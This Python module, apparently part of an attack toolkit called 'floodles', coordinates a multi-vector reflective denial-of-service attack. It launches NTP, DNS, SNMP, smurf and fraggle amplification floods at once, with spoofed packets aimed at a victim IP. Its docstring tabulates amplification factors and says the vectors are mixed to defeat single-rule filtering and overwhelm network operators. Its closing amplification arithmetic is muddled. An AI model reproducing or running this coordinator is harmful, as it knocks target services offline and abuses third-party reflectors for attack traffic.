"""
modules/spray.py - SPRAY
DRDoS (Distributed Reflective Denial of Service) coordinator.
Combines multiple amplification vectors simultaneously.

How it works:
  Coordinates multiple amplification protocols in parallel:
    - NTP monlist  (~550x)
    - DNS ANY      (~60x)
    - SNMP GetBulk (~650x)
    - SSDP         (~30x)
    - Memcached    (~50000x, if present)

  Each protocol uses different reflectors (sourced from Shodan/scan).
  All traffic directed at single victim IP.
  Combined effect: volumetric saturation from many different source IPs
  and protocols simultaneously -> harder to filter by single rule.

  SPRAY is a multi-vector amplification coordinator, not a new protocol.
  It's what makes DRDoS practical: one attacker, many protocols, massive amplification.

Why multi-protocol matters:
  Single protocol mitigation:
    - Block UDP/123 -> stops NTP, but DNS/SNMP continue
    - Rate-limit DNS -> other protocols compensate
  Multi-protocol:
    - Requires per-protocol mitigation rules
    - Overwhelms NOC response capacity
    - Different protocols arrive from different IP ranges

Amplification summary:
  Protocol   | Port | Factor  | Notes
  -----------|------|---------|---------------------------
  SNMP v2c   | 161  | ~650x   | Most effective, widely deployed
  NTP monlist| 123  | ~550x   | Patched in newer NTPd but legacy devices
  Memcached  | 11211| ~50000x | Extreme, rare in modern configs
  DNS ANY    | 53   | ~60x    | Common, partially mitigated by RFC 8482
  SSDP       | 1900 | ~30x    | Consumer/IoT devices
  CharGen    | 19   | ~358x   | Rare but still present on embedded
"""

import threading
import time
from typing import Optional
from dataclasses import dataclass, field


@dataclass
class SprayMetrics:
    vectors_active: int = 0
    start_time: float = field(default_factory=time.time)
    _per_vector: dict = field(default_factory=dict)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def register(self, name: str) -> None:
        with self._lock:
            self._per_vector[name] = {}
            self.vectors_active += 1

    def update(self, name: str, summary: dict) -> None:
        with self._lock:
            self._per_vector[name] = summary

    def summary(self) -> dict:
        with self._lock:
            return {
                "vectors_active": self.vectors_active,
                "elapsed_s":      round(time.time() - self.start_time, 2),
                "vectors":        dict(self._per_vector),
            }


class SprayEngine:
    """
    Multi-vector DRDoS coordinator.
    Launches multiple amplification modules simultaneously.
    """

    def __init__(
        self,
        victim_ip: str,
        vectors: list[dict],
        duration: int = 30,
    ) -> None:
        """
        Args:
            victim_ip : Target IP (spoofed source in all packets).
            vectors   : List of vector configs. Each dict:
                {
                  "type": "ntp"|"dns"|"snmp"|"smurf"|"fraggle",
                  "reflectors": ["1.2.3.4", ...],
                  "threads": 4,
                  # protocol-specific params...
                }
            duration  : Duration in seconds for all vectors.
        """
        self.victim_ip = victim_ip
        self.vectors   = vectors
        self.duration  = duration
        self.metrics   = SprayMetrics()
        self._engines  = []
        self._stop     = threading.Event()

    def start(self) -> None:
        for vec in self.vectors:
            engine = self._launch_vector(vec)
            if engine:
                self._engines.append((vec["type"], engine))
                self.metrics.register(vec["type"])

    def _launch_vector(self, vec: dict):
        vtype      = vec["type"]
        reflectors = vec.get("reflectors", [])
        threads    = vec.get("threads", 4)

        try:
            if vtype == "ntp":
                from floodles.modules.ntp_amp import run
                return run(self.victim_ip, reflectors,
                           threads=threads, duration=self.duration)

            elif vtype == "dns":
                from floodles.modules.dns_amp import run
                return run(self.victim_ip, reflectors,
                           threads=threads, duration=self.duration)

            elif vtype == "snmp":
                from floodles.modules.sniper import run
                community = vec.get("community", "public")
                return run(self.victim_ip, reflectors,
                           community=community,
                           threads=threads, duration=self.duration)

            elif vtype == "smurf":
                from floodles.modules.smurf import run
                return run(self.victim_ip, reflectors,
                           threads=threads, duration=self.duration)

            elif vtype == "fraggle":
                from floodles.modules.fraggle import run
                port = vec.get("port", 7)
                return run(self.victim_ip, reflectors,
                           port=port,
                           threads=threads, duration=self.duration)

            else:
                print(f"[!] Unknown vector type: {vtype}")
                return None

        except Exception as e:
            print(f"[!] Failed to launch vector {vtype}: {e}")
            return None

    def wait(self) -> None:
        for _, engine in self._engines:
            engine.wait()

    def stop(self) -> None:
        for _, engine in self._engines:
            engine.stop()

    def is_running(self) -> bool:
        return any(e.is_running() for _, e in self._engines)


def run(
    victim_ip: str,
    vectors: list[dict],
    duration: int = 30,
) -> SprayEngine:
    """
    Launch multi-vector DRDoS spray.

    Args:
        victim_ip : Target IP (spoofed source in all amplification requests).
        vectors   : List of vector configs. Example:
                    [
                      {"type": "ntp",  "reflectors": ["1.2.3.4"], "threads": 4},
                      {"type": "dns",  "reflectors": ["5.6.7.8"], "threads": 4},
                      {"type": "snmp", "reflectors": ["9.10.11.12"],
                       "community": "public", "threads": 4},
                    ]
        duration  : Duration in seconds.

    Returns:
        SprayEngine (already started).

    Example combined amplification:
        NTP:  4 threads * 550x = effective 2200x per thread
        DNS:  4 threads * 60x  = effective 240x per thread
        SNMP: 4 threads * 650x = effective 2600x per thread
        Total: ~5040x combined amplification factor
    """
    engine = SprayEngine(
        victim_ip=victim_ip,
        vectors=vectors,
        duration=duration,
    )
    engine.start()
    return engine
